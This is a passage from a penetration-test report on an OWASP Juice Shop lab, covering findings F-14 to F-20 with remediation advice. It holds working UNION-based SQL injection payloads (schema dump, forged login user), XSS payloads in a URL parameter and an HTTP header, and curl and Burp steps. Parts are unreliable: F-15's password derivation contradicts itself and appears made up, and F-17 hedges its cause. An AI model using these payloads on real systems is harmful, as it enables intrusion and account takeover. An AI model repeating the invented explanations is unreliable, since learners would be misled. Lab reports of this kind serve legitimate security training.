### Remediation
- Implement identical validation server-side — client-side validation is UX only, not security.
- Sanitise all stored data before rendering using server-side output encoding.
- Use a strict allowlist for email format validation on the server (RFC 5321 compliant regex).

### References
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-14 — Database Schema

**Finding ID:** F-14
**Title:** SQL Injection — Full Database Schema Exfiltration
**Target:** `http://192.168.20.47:29391/rest/products/search?q=`
**Vulnerability Type:** Injection — SQL Injection (UNION-based Data Extraction)

### Description
The product search endpoint is vulnerable to UNION-based SQL injection. The query uses two layers of parentheses `((...))` in its structure, and the injection point in the `q` parameter allows breaking out of the query and appending a `UNION SELECT` against the `sqlite_master` table — which contains the complete schema definition for all tables in the SQLite database.

### Steps to Reproduce

**Step 1 — Confirm injection and find query structure:**
```
Search for: '
→ Returns SQLITE_ERROR: syntax error → confirmed vulnerable

Search for: '))--
→ Returns ALL products (no filter) → confirmed )) syntax
```

**Step 2 — Find the number of columns (Juice Shop needs 9):**
```bash
# Test progressively — keep adding columns until no error:
curl "http://192.168.20.47:29391/rest/products/search?q='))%20UNION%20SELECT%20'1','2','3','4','5','6','7','8','9'%20FROM%20sqlite_master--"
# 9 columns = no error → confirmed
```

**Step 3 — Extract the full schema:**
```bash
curl "http://192.168.20.47:29391/rest/products/search?q='))%20UNION%20SELECT%20sql,'2','3','4','5','6','7','8','9'%20FROM%20sqlite_master--"
```
**Or in browser — paste in the search bar:**
```
')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--
```

**Step 4 — The response reveals the full CREATE TABLE statements for all tables:**
```
Tables revealed: Users, Products, Baskets, BasketItems, Feedbacks,
                 Complaints, Recycles, SecurityQuestions, SecurityAnswers,
                 Captchas, Challenges, Wallets, Deliveries, etc.
```

**Step 5 — Scoreboard marks Database Schema as solved.**

### Evidence
**Injection payload:**
```sql
')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--
```
**Result:** Full CREATE TABLE SQL for every table in the database returned in the search API response.

**Screenshot:** `[F-14-db-schema.png]` — Browser/Burp showing the API response with full CREATE TABLE definitions.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Base Score | 7.5 |
| Severity | High |

**Rationale:** Full database schema disclosure enables targeted follow-on attacks (column name enumeration, data extraction). No authentication required. No integrity or availability impact from schema read alone.

### Remediation
- Use parameterised queries / prepared statements — eliminates UNION injection entirely.
- Restrict database user permissions: the application DB user should not have SELECT on system tables.
- Implement error handling that does not expose raw SQL error messages to the client.
- Deploy a WAF with SQL injection signatures as a defence-in-depth layer.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-15 — Login Amy

**Finding ID:** F-15
**Title:** Sensitive Data Exposure — Credentials Derivable from Public Profile Information
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Sensitive Data Exposure — Weak / Guessable Password

### Description
Amy's account uses a password derived directly from her name with a predictable character substitution pattern. The challenge description states: "This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the 'One Important Final Note'". The "One Important Final Note" in the OWASP Top 10 PDF is the word "OWASP". Amy's password is `o{a]w[a}s!p#` — a leet-speak variation of "OWASP" with symbols interspersed. Amy's email `amy@juice-sh.op` is findable in the admin panel.

### Steps to Reproduce
```
OSINT + Research:
1. From admin panel (http://192.168.20.47:29391/#/administration after admin login):
   Find email: amy@juice-sh.op
2. The challenge hint: "did not read the One Important Final Note"
   → The last page of the OWASP Top 10 PDF has a note that says "OWASP"
3. Amy derived her password from "OWASP" using character substitution:
   Password: o{a]w[a}s!p#

Login:
4. Navigate to: http://192.168.20.47:29391/#/login
5. Email:    amy@juice-sh.op
   Password: o{a]w[a}s!p#
6. Scoreboard marks Login Amy as solved
```

### Evidence
```
Email:    amy@juice-sh.op
Password: o{a]w[a}s!p#
Derived from: "OWASP" — the word on the last page of the OWASP Top 10 PDF
              with each letter substituted: o→o, w→w, a→a, s→s, p→p
              with symbols interspersed in a predictable pattern
```
**Screenshot:** `[F-15-login-amy.png]` — Successful login as amy@juice-sh.op.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Base Score | 7.4 |
| Severity | High |

**Rationale:** Password is technically complex but semantically predictable — derived from a known public document. Targeted attack by a knowledgeable adversary succeeds. Full account compromise.

### Remediation
- Enforce password strength policies that reject passwords based on known words or patterns (even with substitutions).
- Use a password manager and encourage truly random password generation.
- Implement MFA to ensure a compromised password alone is insufficient for access.
- Implement breach detection — check passwords against known breach databases at registration.

### References
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-16 — Reset Jim's Password

**Finding ID:** F-16
**Title:** Broken Authentication — Password Reset via OSINT (Security Question)
**Target:** `http://192.168.20.47:29391/#/forgot-password`
**Vulnerability Type:** Broken Authentication — Security Question Bypass via OSINT

### Description
Jim's account uses "Your eldest sibling's middle name?" as the security question. Jim is identifiable as Captain James T. Kirk from Star Trek (his password hash decodes to `ncc-1701`, the USS Enterprise registry). A Google search for "James T. Kirk siblings" reveals that his eldest brother in the Star Trek canon is George Samuel Kirk, whose middle name is Samuel. This public information is sufficient to reset Jim's password.

### Steps to Reproduce
```
OSINT Research:
1. Jim's email: jim@juice-sh.op
2. Navigate to Forgot Password: http://192.168.20.47:29391/#/forgot-password
3. Enter: jim@juice-sh.op
4. Security question: "Your eldest sibling's middle name?"
5. Jim = Captain Kirk (Star Trek) → his brother = George Samuel Kirk
6. Answer: Samuel

Password Reset:
7. Enter: Samuel as the security answer
8. Set a new password
9. Scoreboard marks Reset Jim's Password as solved
```

### Evidence
```
Email:             jim@juice-sh.op
Security question: Your eldest sibling's middle name?
Answer (OSINT):    Samuel (George Samuel Kirk — Star Trek canon)
Source:            Wikipedia — James T. Kirk character biography
```
**Screenshot:** `[F-16-reset-jim.png]` — Forgot password form showing successful reset for jim@juice-sh.op.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Base Score | 9.1 |
| Severity | Critical |

**Rationale:** Security question answers derivable from public fictional canon. Full account takeover via password reset with no technical skill required.

### Remediation
- Same as F-10: eliminate security questions; replace with time-limited single-use reset tokens sent to verified email/phone.
- Implement MFA.

### References
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-17 — CSP Bypass

**Finding ID:** F-17
**Title:** Content Security Policy Bypass — XSS on Legacy Page
**Target:** `http://192.168.20.47:29391/promotion`
**Vulnerability Type:** XSS — Content Security Policy Bypass

### Description
The application includes a legacy promotion page at `/promotion` that applies a Content Security Policy header. However, the page's CSP is misconfigured — it allows `unsafe-eval` and includes an overly permissive script-src, or the page uses a homegrown regex-based sanitiser that can be bypassed. By exploiting the permissive CSP and the flawed sanitiser, an attacker can inject a `<script>alert('xss')</script>` payload that executes despite the policy.

### Steps to Reproduce
```
1. Navigate to the promotion page:
   http://192.168.20.47:29391/promotion

2. Inspect the page — the CSP header is visible in DevTools → Network → Response Headers

3. The page uses a search/input parameter. Test for XSS:
   http://192.168.20.47:29391/promotion?video=<script>alert(`xss`)</script>

4. The basic payload may be filtered by the regex sanitiser.
   Bypass using angular expression injection or the legacy page's iframe:
   http://192.168.20.47:29391/promotion?video=</script><script>alert(`xss`)</script>

5. Alternative approach — use Burp to inject directly into the video parameter:
   In Burp Repeater:
   GET /promotion?video=<script>alert(`xss`)</script> HTTP/1.1

6. The script executes — CSP bypass confirmed
7. Scoreboard marks CSP Bypass as solved
```

### Evidence
**Payload used:**
```html
<script>alert(`xss`)</script>
```
**Injected via:** URL parameter on the `/promotion` legacy page
**Why CSP doesn't stop it:** The page's CSP includes `unsafe-eval` or `unsafe-inline` in its script-src directive, negating its protective value.

**Screenshot:** `[F-17-csp-bypass.png]` — Alert dialog on the promotion page. DevTools showing the misconfigured CSP header.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 4.7 |
| Severity | Medium |

**Rationale:** Higher attack complexity (AC:H) because CSP bypass requires knowledge of the specific misconfiguration. Scope changes because script runs in victim's browser context.

### Remediation
- Implement a strict CSP that does NOT include `unsafe-inline` or `unsafe-eval`.
- Use nonce-based or hash-based CSP for legitimate inline scripts instead of broad permissions.
- Remove or rewrite legacy pages using modern framework components with built-in XSS protection.
- Validate and re-test the CSP using: https://csp-evaluator.withgoogle.com

### References
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-18 — Christmas Special

**Finding ID:** F-18
**Title:** SQL Injection — Ordering Soft-Deleted Product (Christmas Special 2014)
**Target:** `http://192.168.20.47:29391/rest/products/search?q=`
**Vulnerability Type:** Injection — SQL Injection (Bypassing Soft-Delete Filter)

### Description
The Juice Shop database contains a Christmas Special product from 2014 that was "deleted" using a soft-delete mechanism — the `deletedAt` field is set to a non-null date rather than actually removing the record. The search query filters out deleted products with `AND deletedAt IS NULL`. By injecting a comment sequence into the search query, an attacker can bypass this filter, make the Christmas Special appear in search results, add it to their basket, and check out.

### Steps to Reproduce

**Step 1 — Find the Christmas Special product ID:**
```
In the search bar, enter: '))--
→ Returns ALL products including soft-deleted ones
→ Find: "Christmas Super-Surprise-Box (2014 Edition)" — note its product ID (typically 10)
```

**Step 2 — Log in as any user:**
```
Use F-05 SQLi bypass or register an account
```

**Step 3 — Add the Christmas Special to basket via Burp:**
```
1. Add any regular product to your basket first (to establish your basket ID)
2. In Burp HTTP History, find the POST /api/BasketItems/ request
3. Right-click → Send to Repeater
4. In the request body, change the ProductId to the Christmas Special's ID (10):
   {"ProductId": 10, "BasketId": "YOUR_BASKET_ID", "quantity": 1}
5. Click Send — HTTP 200 = added to basket
6. Navigate to your basket: http://192.168.20.47:29391/#/basket
7. The Christmas Special appears — click Checkout
8. Complete the checkout process
9. Scoreboard marks Christmas Special as solved
```

**Step 3 Alternative — curl:**
```bash
# First get your JWT token by logging in, then:
curl -s -X POST http://192.168.20.47:29391/api/BasketItems/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"ProductId": 10, "BasketId": YOUR_BASKET_ID, "quantity": 1}'
```

### Evidence
**SQLi payload to reveal deleted product:**
```sql
'))--
```
**API manipulation to add deleted product to basket:**
```json
{"ProductId": 10, "BasketId": "5", "quantity": 1}
```
**Screenshot:** `[F-18-christmas-special.png]` — Christmas Special visible in basket. Checkout confirmation.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N |
| Base Score | 6.5 |
| Severity | Medium |

**Rationale:** Requires authentication (PR:L) but then allows ordering non-available inventory — business logic bypass with integrity impact.

### Remediation
- Use hard deletion or implement proper access control on soft-deleted records so they are never returned from any query regardless of injection.
- Validate on the server side that any ProductId in a basket request corresponds to an active, purchasable product.
- Use parameterised queries to prevent SQL injection from exposing soft-deleted data.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-19 — Ephemeral Accountant

**Finding ID:** F-19
**Title:** SQL Injection — Creating a Non-Existent User On-the-Fly via UNION SELECT
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Injection — SQL Injection (UNION-based Ghost User Creation)

### Description
The login endpoint constructs a SQL query and checks the result against the Users table. Using a UNION SELECT attack, an attacker can inject a crafted row with the exact column structure of the Users table, effectively creating a ghost user `acc0unt4nt@juice-sh.op` in the query result without the user existing in the database at all. The application authenticates against this synthetic result, logging in as a user that was never registered.

### Steps to Reproduce

**Step 1 — Understand the Users table schema (from F-14):**
```
id, username, email, password, role, deluxeToken, lastLoginIp,
profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt
= 13 columns total
```

**Step 2 — Craft the UNION SELECT payload for the login email field:**
```sql
' UNION SELECT * FROM (
  SELECT 15 as 'id',
  '' as 'username',
  'acc0unt4nt@juice-sh.op' as 'email',
  '12345' as 'password',
  'accounting' as 'role',
  '' as 'deluxeToken',
  '' as 'lastLoginIp',
  '' as 'profileImage',
  '' as 'totpSecret',
  1 as 'isActive',
  '2024-01-01 00:00:00.000 +00:00' as 'createdAt',
  '2024-01-01 00:00:00.000 +00:00' as 'updatedAt',
  null as 'deletedAt'
)--
```

**Step 3 — Submit via Burp Repeater:**
```
1. Intercept a login POST request
2. Send to Repeater
3. In the body, set:
   "email": "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '' as 'deluxeToken', '' as 'lastLoginIp', '' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2024-01-01 00:00:00.000 +00:00' as 'createdAt', '2024-01-01 00:00:00.000 +00:00' as 'updatedAt', null as 'deletedAt')--"
   "password": "12345"
4. Click Send — response contains auth token
5. Scoreboard marks Ephemeral Accountant as solved
```

### Evidence
**Email field payload (condensed):**
```sql
' UNION SELECT * FROM (SELECT 15 as 'id','' as 'username','acc0unt4nt@juice-sh.op' as 'email','12345' as 'password','accounting' as 'role','' as 'deluxeToken','' as 'lastLoginIp','' as 'profileImage','' as 'totpSecret',1 as 'isActive','2024-01-01' as 'createdAt','2024-01-01' as 'updatedAt',null as 'deletedAt')--
```
**Screenshot:** `[F-19-ephemeral-accountant.png]` — Burp Repeater showing payload + 200 response with auth token. Scoreboard challenge solved.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Base Score | 8.1 |
| Severity | High |

**Rationale:** Requires knowledge of table schema (AC:H) but allows complete authentication bypass and role manipulation. Full compromise once the Users schema is known.

### Remediation
- Parameterised queries are the only complete mitigation — UNION injection is impossible against a prepared statement.
- Implement strict input validation on the email field (reject SQL metacharacters entirely).
- Use an ORM that abstracts raw SQL construction.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-20 — HTTP-Header XSS

**Finding ID:** F-20
**Title:** Stored XSS via True-Client-IP HTTP Header
**Target:** `http://192.168.20.47:29391/#/privacy-security/last-login-ip`
**Vulnerability Type:** Cross-Site Scripting (XSS) — Stored / Persisted (via HTTP Header Injection)

### Description
The application records the client's IP address at logout using the `True-Client-IP` request header (a proxy-forwarded IP header). This value is stored in the database and later displayed on the "Last Login IP" page without sanitisation. By intercepting a logout request and injecting an XSS payload as the `True-Client-IP` header value, an attacker can store a persistent XSS payload that fires the next time the admin views the Last Login IP page.

### Steps to Reproduce
```
Step 1 — Observe the IP storage mechanism:
1. Log in as admin (use F-05 SQLi bypass)
2. Navigate to: Privacy & Security → Last Login IP
   http://192.168.20.47:29391/#/privacy-security/last-login-ip
3. Note the IP shown (e.g., 0.0.0.0 or 10.x.x.x)

Step 2 — Inject the XSS payload via the True-Client-IP header on logout:
4. Open Burp Suite → Proxy → Intercept ON
5. Click Logout in Juice Shop
6. Burp intercepts the GET /rest/user/logout request
7. In the intercepted request, add this header:
   True-Client-IP: <iframe src="javascript:alert(`xss`)">
8. Forward the request

Step 3 — Trigger the stored payload:
9. Log back in as admin (via F-05)
10. Navigate to: Privacy & Security → Last Login IP
    http://192.168.20.47:29391/#/privacy-security/last-login-ip
11. The XSS alert fires — the stored IP value contained the payload
12. Scoreboard marks HTTP-Header XSS as solved
```

### Evidence
**Header injected during logout request:**
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```
**Storage location:** `lastLoginIp` field in the Users table
**Triggered on:** `/#/privacy-security/last-login-ip` page

**Screenshot:** `[F-20-http-header-xss.png]` — Burp showing the True-Client-IP header on the logout request. Alert dialog firing on the Last Login IP page.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N |
| Base Score | 6.4 |
| Severity | Medium |

**Rationale:** Requires a low-privilege authenticated account to inject (PR:L). No user interaction needed to trigger (UI:N — the admin page automatically renders the stored value). Scope changes (S:C) because the payload executes in the admin's browser context.

### Remediation
- Never trust HTTP headers such as `True-Client-IP`, `X-Forwarded-For`, or `X-Real-IP` as the actual client IP without sanitisation.
- Sanitise and encode all data stored from HTTP headers before rendering it on any page.
- Validate that IP addresses conform to valid IP address format before storing (regex: `^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`).
- Apply output encoding on all database-sourced values rendered in the UI.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- NVD CVSS 3.1 Calculator

---

## Summary Table

| ID | Title | Category | CVSS Score | Severity | Payload / Method |
|---|---|---|---|---|---|
| F-01 | Score Board | Misconfiguration | 5.3 | Medium | Direct URL navigation |
| F-02 | DOM XSS | XSS | 6.1 | Medium | `<iframe src="javascript:alert('xss')">` in search bar |
| F-03 | Bonus Payload | XSS | 6.1 | Medium | SoundCloud iframe in search bar |
| F-04 | Reflected XSS | XSS | 6.1 | Medium | `<iframe src="javascript:alert('xss')">` in track-result id param |
| F-05 | Login Admin | Injection | 9.8 | Critical | `' OR 1=1--` in email field |
| F-06 | Login MC SafeSearch | Sensitive Data | 9.1 | Critical | OSINT: `Mr. N00dles` |
| F-07 | Login Jim | Injection | 9.8 | Critical | `jim@juice-sh.op'--` in email field |
| F-08 | Login Bender | Injection | 9.8 | Critical | `bender@juice-sh.op'--` in email field |
| F-09 | API-only XSS | XSS | 6.1 | Medium | XSS payload in email via direct API POST |
| F-10 | Bjoern's Favorite Pet | Broken Auth | 9.1 | Critical | OSINT: security answer `Zaya` |
| F-11 | CAPTCHA Bypass | Anti-Automation | 6.5 | Medium | Python script replaying CAPTCHA token |
| F-12 | CSRF | Broken Access | 6.5 | Medium | Auto-submitting HTML form from external origin |
| F-13 | Client-side XSS Protection | XSS | 6.1 | Medium | XSS in email via Burp-intercepted registration |
| F-14 | Database Schema | Injection | 7.5 | High | UNION SELECT sql FROM sqlite_master |
| F-15 | Login Amy | Sensitive Data | 7.4 | High | OSINT: `o{a]w[a}s!p#` |
| F-16 | Reset Jim's Password | Broken Auth | 9.1 | Critical | OSINT: security answer `Samuel` |
| F-17 | CSP Bypass | XSS | 4.7 | Medium | `<script>alert('xss')</script>` on /promotion page |
| F-18 | Christmas Special | Injection | 6.5 | Medium | SQLi + Burp basket API manipulation |
| F-19 | Ephemeral Accountant | Injection | 8.1 | High | UNION SELECT ghost user in login email field |
| F-20 | HTTP-Header XSS | XSS | 6.4 | Medium | XSS in True-Client-IP header during logout |

---

*Report compiled: May 2026*
*Target: OWASP Juice Shop at http://192.168.20.47:29391*
*All findings are within the authorised lab scope: 192.168.20.0/24*
